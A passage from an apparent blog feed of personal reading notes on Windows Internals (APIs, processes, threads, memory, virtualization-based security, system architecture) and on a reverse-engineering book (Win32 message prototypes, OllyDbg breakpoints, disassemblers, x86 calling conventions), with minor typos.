introduction of 64-bit versions of Windows, the API to the 32-bit versions of the Windows OS was called the Win32 API to distinguish it from the original 16-bit Windows API.</p><p>The term Windows API refers to both the 32-bit and 64-bit API to Windows.</p><h3 id="Windows-API-flavors"><a href="#Windows-API-flavors" class="headerlink" title="Windows API flavors"></a>Windows API flavors</h3><p>COM was originally created to enable Microsoft Office applications to communicate and exchange data between documents (such as embedding an Excel chart inside a Word document or a PowerPoint presentation). This ability is called Object Linking and Embedding (OLE). OLE was originally implemented using an old Windows messaging mechanism called Dynamic Data Exchange (DDE).</p><p>COM is baed on two foundational principles. First, client communicate with objects (sometimes called COM server object) through interfaces——well-defined contracts with a set of logically related methods grouped under the virtual table dispatch mechanism, wich is also a common way for C++ compilers to implement virtual functions dispatch.<br>The second principle is that component implementation is loaded dynamically rather than being statically linked to the client.</p><p>The term COM server typically refers to a Dynamic Link Library (DLL) or an executable (EXE) where the COM classes are implemented.</p><h3 id="The-Windows-Runtime"><a href="#The-Windows-Runtime" class="headerlink" title="The Windows Runtime"></a>The Windows Runtime</h3><p>Windows 8 introduced a new API and supporting runtime called Windows Runtime (sometimes abbreviated WinRT, not to be confused with Windows RT, the discontinued ARM-based Windows OS version).</p><p>From an API perspective, WInRT is built on top of COM, adding various extensions to the base COM infrastructure.</p><p><strong>The .NET Framework</strong><br>The .NET Framework is part of Windows.</p><div class="table-container"><table><thead><tr><th>Windows Version</th><th>.NET Framework Version</th></tr></thead><tbody><tr><td>Windows 8</td><td>4.5</td></tr><tr><td>Windows 8.1</td><td>4.5.1</td></tr><tr><td>Windows 10</td><td>4.6</td></tr><tr><td>Windows 10 version 1511</td><td>4.6.1</td></tr><tr><td>Windows 10 version 1607</td><td>4.6.2</td></tr></tbody></table></div><p>The .NET Framework consists of two major components:</p><ul><li><strong>The Common Language Runtime (CLT)</strong></li><li><strong>The .NET Framework Class Library (FCL)</strong></li></ul><p align="center" class='item-img' data-src='/images/books/WindowsInternal1/1.1.png'><img src="/images/books/WindowsInternal1/1.1.png" width="600"></p><h3 id="Services-functions-and-routines"><a href="#Services-functions-and-routines" class="headerlink" title="Services, functions, and routines"></a>Services, functions, and routines</h3><ul><li><strong>Windows API functions</strong></li><li><strong>Native system service (or system calls)</strong></li><li><strong>Kernel support functions (or routines)</strong></li></ul><h3 id="Processes"><a href="#Processes" class="headerlink" title="Processes"></a>Processes</h3><p>Although programs and process appear similar on the surface, they are fundamentally different.</p><p>A <em>program</em> is a static sequence of instructions, whereas a <em>process</em> is a container for a set of resources used when executing the instance of the program.</p><ul><li><strong>A private virtual address space</strong></li><li><strong>An executable program</strong></li><li><strong>A list of open handles</strong></li><li><strong>A security context</strong></li><li><strong>A process ID</strong></li><li><strong>At least one thread of execution</strong></li></ul><h3 id="Threads"><a href="#Threads" class="headerlink" title="Threads"></a>Threads</h3><p>A <em>thread</em> is an entity within a process that Windows schedules for execution. Without it, the process’s program can’t run. A thread includes the follow essential components:</p><ul><li>The contents of a set of CPU registers representing the state of the processor</li><li>Two stacks——one for the thread to use while executing in kernel mode and one for executing in user mode.</li><li>A private storage area called <em>thread-lcoal storage (TLS)*</em> for use by subsystems, run-time libraries, and DLLs.</li><li>A unique identifier called a <em>thread ID</em> (part of an internal structure called a <em>client ID</em>; process IDs and thread IDs are generated out of the same namespace, so they never overlap)</li></ul><p>The threads of a 32-bit application running on a 64-bit version of WIndows will contain both 32-bit and 64-bit context, which Wow64 will use to switch the applicaion from running in 32-bit to 64-bit mode when required. These threads will have two user stacks and two <strong>CONTEXT</strong> blocks, and the usual Windows API functions will return the 64-bit context instead. The <code>Wow64GetThreadContext</code> function, however, will return the 32-bit context.</p><h4 id="Fibers"><a href="#Fibers" class="headerlink" title="Fibers"></a>Fibers</h4><p>Fibers allow an application to schedule its own threads of execution rather than rely on the priority-based scheduling mechanism built into Windows. Fibers are often called <em>lightweight threads</em>. In terms of scheduling, they are invisible to the kernel because they are implementeed in user mode in <code>kernel32.dll</code>. To use fibers, you first make a call to the Windows <code>ConvertThreadToFiber</code> function. This function converts the thread to a running fiber. Afterward, the newly converted fiber can create additonal fibers via the <code>CreateFiber</code> function (Each fiber can have its own set of fibers).</p><h4 id="User-mode-scheduling-threads"><a href="#User-mode-scheduling-threads" class="headerlink" title="User-mode scheduling threads"></a>User-mode scheduling threads</h4><p>User-mode schedulnig (UMS) threads, which are available only on 64-bit versions of Windows, provide the same basic advantages as fibers——and only a few of the disadvantages. UMS threads have their own kernel thread stat and are therefore visible to the kernel, which allows multiple UMS threads to issue blocking system calls and share and contend on resources.</p><p align="center" class='item-img' data-src='/images/books/WindowsInternal1/1.2.png'><img src="/images/books/WindowsInternal1/1.2.png" width="600"></p><h3 id="Jobs"><a href="#Jobs" class="headerlink" title="Jobs"></a>Jobs</h3><p>Windows provides an extension to the process model called a <em>job</em>. A job object’s main function is to allow the management and manipulation of groups of processes as a unit.</p><p>A job object allows control of certain attributes and provides limits for the process or processes associated with the job.</p><h3 id="Virtual-Memory"><a href="#Virtual-Memory" class="headerlink" title="Virtual Memory"></a>Virtual Memory</h3><p align="center" class='item-img' data-src='/images/books/WindowsInternal1/1.3.png'><img src="/images/books/WindowsInternal1/1.3.png" width="600"></p><p>Windows implements a virtual memory system based on a flat (linear) address space that provides each process with the illusion of having its own large, private address space.</p><p>Virtual memory provides a logical view of memory that might not correspond to its physical layout.</p><p align="center" class='item-img' data-src='/images/books/WindowsInternal1/1.4.png'><img src="/images/books/WindowsInternal1/1.4.png" width="600"></p><h3 id="Kernel-mode-vs-user-mode"><a href="#Kernel-mode-vs-user-mode" class="headerlink" title="Kernel mode vs. user mode"></a>Kernel mode vs. user mode</h3><p>To protect user applications from accessing and/or modifying critical OS data, Windows uses two processor access modes (even if the processor on which Windows is running supports more than two): <strong>user mode</strong> and <strong>kernel mode</strong>. User application code runs in user mode, whereas OS code (such as system services and device drivers) runs in kernel mode.</p><p>Kernel mode refers to a mode of execution in a processor that grants access to all system memory and all CPU instructions.</p><p>Although each Windows process has its own private memory space, the kernel-mode OS and device-driver code share a single virtual address space. Each page in virtual memory is tagged to indicate what access mode the processor must be in to read and/or write the page.</p><p>Pages in system space can be accessed only from kernel mode, whereas all pages in the user address space are accessible from user mode and kernel mode.</p><p>Windows 10 drivers must be signed by only two of the accepted certification authorities with a SHA-2 Extended Validation (EV) Hwardware certificate instead of the regular file-based SHA-1 certiicate and its 20 authorities.</p><h3 id="Hypervisor"><a href="#Hypervisor" class="headerlink" title="Hypervisor"></a>Hypervisor</h3><p>The need for fast, efficient, and secure virtualization has driven new models of computing and reasoning about software.</p><p>To provide such virtualization services, almost all modern solutions employ the use of a <strong>hypervisor</strong>, which is a specialized and highly privileged component that allows for the virtualization and isolation of all resources on the machine, from virtual to physical memory, to device interrupts, and even to PCI and USB devices.</p><p>In Windows 10, Microsoft now leverages the Hyper-V hypervisor to provide a new set of services known as <strong>virtualization-based security (VBS)</strong>:</p><ul><li><strong>Device Guard</strong>: This provides Hypervisor Code Integrity (HVCI) for stronger code-signing guaratees over KMCS alone, and allows for the custumization of the signature policy of the Windows OS, for both user-mode and kernel mode code.</li><li><strong>Hyper Guard</strong>: This protects key kernel-related and hypervisor-related data structures and code.</li><li><strong>Credential Guard</strong>: This prevents unauthorized access to domain account credentials and secrets, combined with secure biometrics.</li><li><strong>Application Guard</strong>: This provides an even stronger sandbox for the Microsoft Edge browser.</li><li><strong>Host Guardian and Shielded Fabric</strong>: These leverage a virtual TPM (v-TPM) to protect a virtual machine from the infrastructure it’s running on.</li></ul><p>Additionally, the Hyper-V hypervisor enables certain key kernel mitigations against exploits and other attackers.</p><h3 id="Firmware"><a href="#Firmware" class="headerlink" title="Firmware"></a>Firmware</h3><h3 id="Terminal-Services-and-multiple-sessions"><a href="#Terminal-Services-and-multiple-sessions" class="headerlink" title="Terminal Services and multiple sessions"></a>Terminal Services and multiple sessions</h3><p><strong>Terminal Services</strong> refers to the support in Windows for multiple interactive user sessions on a single systerm.</p><p>With Windows Terminal Services, a remote user can establish a session on another machine, log in, and run applications on the server.</p><p>The first session is considered the services session, or session zero, and contains system service hosing processes.</p><h3 id="Objects-and-handles"><a href="#Objects-and-handles" class="headerlink" title="Objects and handles"></a>Objects and handles</h3><p>In the Windows OS, a <strong>kernel object</strong> is a single, run-time instance of a statically defined object type. An <strong>object type</strong> comprises a system-defined data type, functions that operate on instances of the data type, and a set of object attributes.</p><p>The most fundamental difference between an object and an ordinary data structure is that the internal structure of an object is opaque. You must call an object service to get data out of or put data into an object. You can’t directly read or change data in side an object.</p><p>Objects, through the help of a kernel component called the <strong>object manager</strong>.</p><p>Not all data structures in the Windows OS are objects. Only data that needs to be shared, protected, named, or made visible to user-mode programs (via system services) is placed in objects. Structures used by only one component of the OS to implement internal functions are not objects.</p><h3 id="Security"><a href="#Security" class="headerlink" title="Security"></a>Security</h3><p>Windows has three forms of access control over objects:</p><ul><li><strong>Discretionary access control</strong>: It’s the method by which owners of objects (such as files or printers) grant or deny access to others. With Windows Server 2012 and Windows 8, this form of discretionary control is further improved by implementing attribute-based access control (also called Dynamic Access Control).</li><li><strong>Privileged access control</strong>: This is necessary for those times when discretionary access control is not enough. It’s a method of ensuring that someone can get to protected objects if the owner isn’t available.</li><li><strong>Mandatory integrity control</strong>: This is required when an additional level of security control is needed to protect objects that are being accessed from within the same user account.</li></ul><p>Starting with Windows 8, a sandbox called an <strong>AppContainer</strong> is used to host Windows Apps, which provides isolation with relation to other AppContainers and non-Windows Apps processes.</p><h3 id="Registry"><a href="#Registry" class="headerlink" title="Registry"></a>Registry</h3><h3 id="Unicode"><a href="#Unicode" class="headerlink" title="Unicode"></a>Unicode</h3><h1 id="Chapter-2-System-architecture"><a href="#Chapter-2-System-architecture" class="headerlink" title="Chapter 2 - System architecture"></a>Chapter 2 - System architecture</h1><h2 id="Operating-system-model"><a href="#Operating-system-model" class="headerlink" title="Operating system model"></a>Operating system model</h2><h2 id="Architecture-overview"><a href="#Architecture-overview" class="headerlink" title="Architecture overview"></a>Architecture overview</h2><p>Despite its pervasive use of objects to represent shared system resources, Windows is not an object-oriented system in the strict sense. Most of the kernel-mdoe OS code is written in C for portability. The C programming language doesn’t directly support object-oriented constructs such as polymorphic functions or class inheritance. Therefore, the C-based implementation of objects in Windows borrows from, but doesn’t depend on, features of particular object-oriented languages.</p><p align="center" class='item-img' data-src='/images/books/WindowsInternal1/2.1.png'><img src="/images/books/WindowsInternal1/2.1.png" width="600"></p><p>The boexes above the line represent user-mode processes, and the components below the line are kernel-mode OS services.</p><p>A second dividing line between kernel-mode parts of Windwos and the hypervisor is also visible. The hypervisor still runs with the same CPU privilege level (0) as the kernel, but because it uses specialized CPU instructions (VT-x on Intel, SVM on AMD), it can both isolate itself from the kernel while also monitoring it (and applications). Some people may call it <strong>ring -1</strong>, which is <strong>INACCURATE</strong>.</p><p>Four basic types of user-mode processes:</p><ul><li><strong>User processes</strong></li><li><strong>Service processes</strong></li><li><strong>System processes</strong></li><li><strong>Environment sybsystem server processes</strong></li></ul><p>Windows 10 Version 1607 includes a Windows Sybsystem for Linux (WSL) in beta state for developers only. However, this is not a true subsystem as described in this section.</p><p>Notice the Sybsystem DLLs blox below the Service Processes and User Processes boxes. Under Windows, user applications don’t call the native Windows OS services directly. Rather, they go through on or more <strong>subsystem dynamic-link libraries (DLLs)</strong>. The role of subsystem DLLs is to translate a documented function into the appropriate internal (and generally undocumented) native system service calls implemented mostly in <strong>Ntdll.dll</strong>.</p><p>The kernel-mode components of Windows include the following:</p><ul><li><strong>Executive</strong>: The Windows executive contains the base OS services, such as memory management, process and thread management, security, I/O, networking, and inter-process communication.</li><li><strong>The Windows kernel</strong></li><li><strong>Device drivers</strong>: This includes both hardware device drivers, and non-hardware device drivers.</li><li><strong>The Hardware Abstraction Layer (HAL)</strong></li><li><strong>The windowing and graphics system</strong></li><li><strong>The hypervisor layer</strong>: This is composed of the hypervisor itself. There are no drivers or other modules in this environment. The hypervisor is itself composed of multiple internal layers and services, such as its own memory manager, virtual processor scheduler, interrupt and timer management, synchronization routines, partitions, IPC and more.</li></ul><p>Core Windows System Files:</p><div class="table-container"><table><thead><tr><th>File Name</th><th>Components</th></tr></thead><tbody><tr><td>Ntoskrnl.exe</td><td>Executive and kernel</td></tr><tr><td>Hal.dll</td><td>HAL</td></tr><tr><td>Win32.sys</td><td>Kernel-mode part of the Windows subsystem (GUI)</td></tr><tr><td>Hvix64.exe (Intel), Hvax64.exe (AMD)</td><td>Hypervisor</td></tr><tr><td>.sys file in \SystemRoot\System32\Drivers</td><td>Core driver files, such as Direct X, Volume Manager, TCP/IP, TPM, andACPI supprot.</td></tr><tr><td>Ntdll.dll</td><td>Internal support functions and system service dispatch stubs to executive functions</td></tr><tr><td>Kernel32.dll, Advapi32.dll, User32.dll, Gdi32.dll</td><td>Core Windows subsystem DLLs.</td></tr></tbody></table></div><h3 id="Portability"><a href="#Portability" class="headerlink" title="Portability"></a>Portability</h3><p>Windows archives portability accross hardware architectures and platforms in two primary ways:</p><ul><li><strong>By using layered design</strong></li><li><strong>By using C</strong></li></ul><h3 id="Symmetric-multiprocessing"><a href="#Symmetric-multiprocessing" class="headerlink" title="Symmetric multiprocessing"></a>Symmetric multiprocessing</h3><p>Windows is a <strong>symmetric multiprocessing (SMP)</strong> OS. There is no master processor——the OS as well as user threads can be scheduled to run on any processor. Also, all the processors share just one memory space. This module contrasts with <strong>asymmetric multiprocessing (ASMP)</strong>, in which the OS typically selects one processor to execute OS kernel code while other processors run only user code.</p><p align="center" class='item-img' data-src='/images/books/WindowsInternal1/2.2.png'><img src="/images/books/WindowsInternal1/2.2.png" width="600"></p><p>Windows also supports four modern types of multiprocessor system: multicore, simultaneous multi-threaded (SMT), heterogeneous, and non-uniform memory access (NUMA).</p><h3 id="Scalability"><a href="#Scalability" class="headerlink" title="Scalability"></a>Scalability</h3><h3 id="Differences-between-client-and-server-versions"><a href="#Differences-between-client-and-server-versions" class="headerlink" title="Differences between client and server versions"></a>Differences between client and server versions</h3><h3 id="Checked-build"><a href="#Checked-build" class="headerlink" title="Checked build"></a>Checked build</h3><h2 id="Virtualization-based-security-architecture-overview"><a href="#Virtualization-based-security-architecture-overview" class="headerlink" title="Virtualization-based security architecture overview"></a>Virtualization-based security architecture overview</h2><p>The separation between user mode and kernel mode provides protection for the OS from user-mode code, whether malicious or not.</p><p align="center" class='item-img' data-src='/images/books/WindowsInternal1/2.3.png'><img src="/images/books/WindowsInternal1/2.3.png" width="600"></p><p>Here VBS stands for Virtualization-Based Security. VTL stands for Virtual Trust Levels.</p><p>The user/kernel code is running on top of a Hyper-V hypervisor. The difference is that with VBS enabled, a VTL of 1 is now present, which contains its own secure kernel running in the privileged processor mode (that is, ring 0 on x86/x64).</p><p>Similarly, a run-time user environment mode, called the Isolated User Mode (IUM), now exists, which runs in unprivileged mode (that is, ring 3).</p><h2 id="Key-system-components"><a href="#Key-system-components" class="headerlink" title="Key system components"></a>Key system components</h2><p>The role of an environment subsystem is to expose some subset of the base Windows executive system services to application programs.</p><p>User applications don’t call Windows system services directly. Instead, they go through one or more subsystem DLLs. These libraries export the documented interface that the programs linked to that subsystem can called.</p><h3 id="Executive"><a href="#Executive" class="headerlink" title="Executive"></a>Executive</h3><p>The executive includes the following types of functions:</p><ul><li><strong>Functions that are exported and callable from user mode</strong>: These functions are called system services and are exported via Ntdll.dll</li><li><strong>Device driver functions that are called through the DeviceIoControl function</strong></li><li><strong>Functions that can be called only from kernel mode that are exported and documented in the WDK</strong></li><li><strong>Functions that are defined as global symbols but are not exported</strong></li><li><strong>Functions that are internal to a module that are not defined as global symbols</strong></li></ul><h3 id="Kernel"><a href="#Kernel" class="headerlink" title="Kernel"></a>Kernel</h3><p>The kernel consists of a set of functions in <code>Ntoskrnl.exe</code> that provides fundamental mechanisms. THese include thread-scheduling and synchronization services, used by the executive components, and low-level hardware architecture——dependent support, such as interrupt and exception dispatching, which is different on each processor architecture.</p><p>The kernel provides a low-level based of well-defined, predictable OS primitives and mechanisms that allow higher-level components of the executive to do what they need to do.</p><h3 id="HAL"><a href="#HAL" class="headerlink" title="HAL"></a>HAL</h3><h3 id="Device-Drivers"><a href="#Device-Drivers" class="headerlink" title="Device Drivers"></a>Device Drivers</h3><h3 id="System-Processes"><a href="#System-Processes" class="headerlink" title="System Processes"></a>System Processes</h3><h1 id="Chapter-3-Processes-and-jobs"><a href="#Chapter-3-Processes-and-jobs" class="headerlink" title="Chapter 3 - Processes and jobs"></a>Chapter 3 - Processes and jobs</h1><ul><li>CreateProcess</li><li>CreateProcessAsUser: If a different token is required.</li><li>CreateProcessWithTokenW (advapi32.dll)</li><li>CreateProcessWithLogonW (advapi32.dll)</li><li>SlrCreateProcessWithLogon</li></ul><p align="center" class='item-img' data-src='/images/books/WindowsInternal1/3.1.png'><img src="/images/books/WindowsInternal1/3.1.png" width="600"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;El-libro&quot;&gt;&lt;a href=&quot;#El-libro&quot; class=&quot;headerlink&quot; title=&quot;El libro&quot;&gt;&lt;/a&gt;El libro&lt;/h1&gt;&lt;p align=&quot;center&quot; class=&#39;item-img&#39; data-src=&#39;/ima</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>[Book] Encrypting and Decrypting a Software</title>
    <link href="http://example.com/2026/01/23/2026-1-23-SoftwareCrypto/"/>
    <id>http://example.com/2026/01/23/2026-1-23-SoftwareCrypto/</id>
    <published>2026-01-22T16:47:22.000Z</published>
    <updated>2026-01-27T07:31:37.920Z</updated>
    
    <content type="html"><![CDATA[<h1 id="El-libro"><a href="#El-libro" class="headerlink" title="El libro"></a>El libro</h1><p align="center" class='item-img' data-src='/images/books/SoftwareCrypto/libro.jpg'><img src="/images/books/SoftwareCrypto/libro.jpg" width="500"></p><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>This article is used to keep notes and summaries of the book “Encrypting and Decrypting a Software”.<br>The content will be continuously updated as I read through the book.</p><h1 id="Reflection"><a href="#Reflection" class="headerlink" title="Reflection"></a>Reflection</h1><p>This book covers many topics and has almost 1,000 pages.</p><p align="center" class='item-img' data-src='/images/meme/mika_nagisa_rollcake.png'><img src="/images/meme/mika_nagisa_rollcake.png" width="300"></p><p>The book includes the following topics:</p><ul><li>Software cracking (patching and bypassing)</li><li>Mathematical cryptography (with formulas and expressions)</li><li>Software vulnerabilities (stack buffer overflow and heap buffer overflow)</li><li>Software packing, unpacking, and packer stubs</li><li>Reverse engineering</li></ul><p>Most of the topics focus on Windows rather than Linux.</p><p>Personally, I do not recommend this book for beginners in reverse engineering. Although the topics are broad, the book does not explore them in great depth. While the book introduces a wide range of topics, some of them could benefit from more detailed explanations, which may make the book less accessible to beginners.</p><p>There are several typos in the book, such as misusing the terms <em>byte</em> and <em>bit</em>, which was quite confusing.</p><p>The biggest drawback is that the example source code is very difficult to obtain for foreign readers. It would be excellent if the authors uploaded their source code to GitHub, similar to the author of <a href="https://iss4cf0ng.github.io/2026/01/04/2026-1-4-BookReverseEngineeringCore/">Reverse Engineering Core</a>.</p><p>On the other hand, since the book covers many topics, it can be used as a reference or dictionary. In addition, it includes some topics that are rarely discussed in other books.</p><h1 id="Chapter-1-Fundamental-Knowledge"><a href="#Chapter-1-Fundamental-Knowledge" class="headerlink" title="Chapter 1 - Fundamental Knowledge"></a>Chapter 1 - Fundamental Knowledge</h1><h2 id="1-3-Windows-OS"><a href="#1-3-Windows-OS" class="headerlink" title="1.3 - Windows OS"></a>1.3 - Windows OS</h2><h3 id="Win32-API"><a href="#Win32-API" class="headerlink" title="Win32 API"></a>Win32 API</h3><ul><li>Kernel (kernel32.dll): Processes, threads, memory, file IO, etc.</li><li>User (user32.dll): Mouse click, keyboard input, window, menu, etc.</li><li>GDI (gdi32.dll): Display text.</li><li>advapi32.dll</li><li>comctl32.dll</li><li>comdlg32.dll</li><li>shell32.dll</li><li>netapi32.dll</li></ul><p>For Win32 API functions, “A” stands for ANSI. “W” stands for Widechars(Unicode).</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">int MessageBox(<br>    HWND hWnd,<br>    LPCTSTR lpText,<br>    LPCTSTR lpCaption,<br>    UINT uType<br>);<br></code></pre></td></tr></table></figure><h3 id="WOW64"><a href="#WOW64" class="headerlink" title="WOW64"></a>WOW64</h3><p>WOW64 stands for <strong>Windows on Windows 64-bit</strong>.</p><h3 id="Windows-Message-Mechanism"><a href="#Windows-Message-Mechanism" class="headerlink" title="Windows Message Mechanism"></a>Windows Message Mechanism</h3><p><strong>SendMessage()</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">LRESULT SendMessage(<br>    HWND hWnd,<br>    UINT Msg,<br>    WPARAM wParam,<br>    LPARAM lParam<br>);<br></code></pre></td></tr></table></figure></p><p><strong>WM_COMMAND</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">WM_COMMAND<br>    wNotifyCode = HIWORD(wParam);<br>    wID = LOWORD(wParam);<br>    hwndCtl = (HWND)lParam;<br></code></pre></td></tr></table></figure></p><p><strong>WM_GETTEXT</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">WM_GETTEXT<br>    wParam = (WPARAM)cchTextMax;<br>    lParam = (LPARAM)lpszText;<br></code></pre></td></tr></table></figure></p><p><strong>WM_QUIT</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">WM_QUIT<br>    nExitCode = (int)wParam;<br></code></pre></td></tr></table></figure></p><p><strong>WM_LBUTTONDOWN</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">WM_LBUTTONDOWN<br>    fwKeys = wParam;<br>    xPos = LOWORD(lParam);<br>    yPos = HIWORD(lParam);<br></code></pre></td></tr></table></figure></p><h3 id="Virtual-Memory"><a href="#Virtual-Memory" class="headerlink" title="Virtual Memory"></a>Virtual Memory</h3><h1 id="Chapter-2-Dynamic-Analysis"><a href="#Chapter-2-Dynamic-Analysis" class="headerlink" title="Chapter 2 - Dynamic Analysis"></a>Chapter 2 - Dynamic Analysis</h1><h2 id="2-1-OllyDbg"><a href="#2-1-OllyDbg" class="headerlink" title="2.1 - OllyDbg"></a>2.1 - OllyDbg</h2><h3 id="BreakPoint"><a href="#BreakPoint" class="headerlink" title="BreakPoint"></a>BreakPoint</h3><ol><li>INT 3  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">004013A5 CC D0404000<br></code></pre></td></tr></table></figure>OllyDbg replaces the original instruction to <code>0xCC</code>. However, the original instruction in displayed.</li><li><p>Hardware BreakPoint<br>Hardware break points are implemented with <code>DRx</code> registers. The addresses of break points are stored into <code>DR0</code> ~ <code>DR3</code>, while <code>DR7</code> stores the status. Thus, the maximum number of hardware break points are is 4.</p> <p align="center" class='item-img' data-src='/images/books/SoftwareCrypto/2.1.png'><img src="/images/books/SoftwareCrypto/2.1.png" width="500"> </p> <p align="center" class='item-img' data-src='/images/books/SoftwareCrypto/2.2.png'><img src="/images/books/SoftwareCrypto/2.2.png" width="500"> </p> <p align="center" class='item-img' data-src='/images/books/SoftwareCrypto/2.3.png'><img src="/images/books/SoftwareCrypto/2.3.png" width="500"> </p> <p align="center" class='item-img' data-src='/images/books/SoftwareCrypto/2.4.png'><img src="/images/books/SoftwareCrypto/2.4.png" width="500"> </p> <p align="center" class='item-img' data-src='/images/books/SoftwareCrypto/2.5.png'><img src="/images/books/SoftwareCrypto/2.5.png" width="500"> </p> <p align="center" class='item-img' data-src='/images/books/SoftwareCrypto/2.6.png'><img src="/images/books/SoftwareCrypto/2.6.png" width="500"> </p></li><li><p>Memory BreakPoint</p><ol><li>On Access</li><li><p>On Write</p><p align="center" class='item-img' data-src='/images/books/SoftwareCrypto/2.7.png'><img src="/images/books/SoftwareCrypto/2.7.png" width="500"></p></li></ol></li><li><p>Set break-on-access</p> <p align="center" class='item-img' data-src='/images/books/SoftwareCrypto/2.8.png'><img src="/images/books/SoftwareCrypto/2.8.png" width="500"> </p></li><li><p>Message BreakPoint</p><ol><li>View -&gt; Windows</li><li><p>Message breakpoint on ClassProc</p><p align="center" class='item-img' data-src='/images/books/SoftwareCrypto/2.9.png'><img src="/images/books/SoftwareCrypto/2.9.png" width="500"></p><p align="center" class='item-img' data-src='/images/books/SoftwareCrypto/2.10.png'><img src="/images/books/SoftwareCrypto/2.10.png" width="500"></p></li></ol></li><li><p>Conditional BreakPoint</p> <p align="center" class='item-img' data-src='/images/books/SoftwareCrypto/2.11.png'><img src="/images/books/SoftwareCrypto/2.11.png" width="500"> <figcaption> Shift+F2 </figcaption> </p></li><li>Conditional Log</li></ol><h2 id="2-3-MDebug"><a href="#2-3-MDebug" class="headerlink" title="2.3 - MDebug"></a>2.3 - MDebug</h2><h2 id="2-4-WinDbg"><a href="#2-4-WinDbg" class="headerlink" title="2.4 - WinDbg"></a>2.4 - WinDbg</h2><h1 id="Chapter-3-Static-Analysis"><a href="#Chapter-3-Static-Analysis" class="headerlink" title="Chapter 3 - Static Analysis"></a>Chapter 3 - Static Analysis</h1><h2 id="3-2-Disassembly-Engine"><a href="#3-2-Disassembly-Engine" class="headerlink" title="3.2 - Disassembly Engine"></a>3.2 - Disassembly Engine</h2><ol><li>ODDisasm</li><li>BeaEngine</li><li>Udis86</li><li>Capstone</li><li>AsmJit</li><li>Keystone</li></ol><h2 id="3-3-Static-Disassembly"><a href="#3-3-Static-Disassembly" class="headerlink" title="3.3 - Static Disassembly"></a>3.3 - Static Disassembly</h2><h3 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h3><p align="center" class='item-img' data-src='/images/books/SoftwareCrypto/3.1.png'><img src="/images/books/SoftwareCrypto/3.1.png" width="500"></p><p align="center" class='item-img' data-src='/images/books/SoftwareCrypto/3.2.png'><img src="/images/books/SoftwareCrypto/3.2.png" width="700"></p><p align="center" class='item-img' data-src='/images/books/SoftwareCrypto/3.3.png'><img src="/images/books/SoftwareCrypto/3.3.png" width="700"></p><p align="center" class='item-img' data-src='/images/books/SoftwareCrypto/3.4.png'><img src="/images/books/SoftwareCrypto/3.4.png" width="700"></p><p align="center" class='item-img' data-src='/images/books/SoftwareCrypto/3.5.png'><img src="/images/books/SoftwareCrypto/3.5.png" width="700"></p><h3 id="Hexadecimal-Tools"><a href="#Hexadecimal-Tools" class="headerlink" title="Hexadecimal Tools"></a>Hexadecimal Tools</h3><ul><li>HexWorkship</li><li>WinHex</li><li>Hiew</li></ul><h1 id="Chapter-4-Reverse-Engineering-Techniques"><a href="#Chapter-4-Reverse-Engineering-Techniques" class="headerlink" title="Chapter 4 - Reverse Engineering Techniques"></a>Chapter 4 - Reverse Engineering Techniques</h1><h2 id="4-1-Reverse-Engineering-on-x32-Platform"><a href="#4-1-Reverse-Engineering-on-x32-Platform" class="headerlink" title="4.1 - Reverse Engineering on x32 Platform"></a>4.1 - Reverse Engineering on x32 Platform</h2><h3 id="Calling-Convention"><a href="#Calling-Convention" class="headerlink" title="Calling Convention"></a>Calling Convention</h3><p>Example1:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">test1(p1, p2, p3);<br></code></pre></td></tr></table></figure></p><p><strong>__cdecl</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">push p3     ; right to left<br>push p2<br>push p1<br>call test1<br>add esp,0C  ; stack cleanup<br></code></pre></td></tr></table></figure></p><p><strong>pascal</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">push p1     ; left to right<br>push p2<br>push p3<br>call test1  ; stack cleanup in the function<br></code></pre></td></tr></table></figure></p><p><strong>stdcall</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">push p3     ; right to left<br>push p2<br>push p1<br>call test1  ; stack cleanup in the function<br></code></pre></td></tr></table></figure></p><hr><p>Example2:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">test2(p1, p2);<br></code></pre></td></tr></table></figure></p><p><strong>stdcall</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 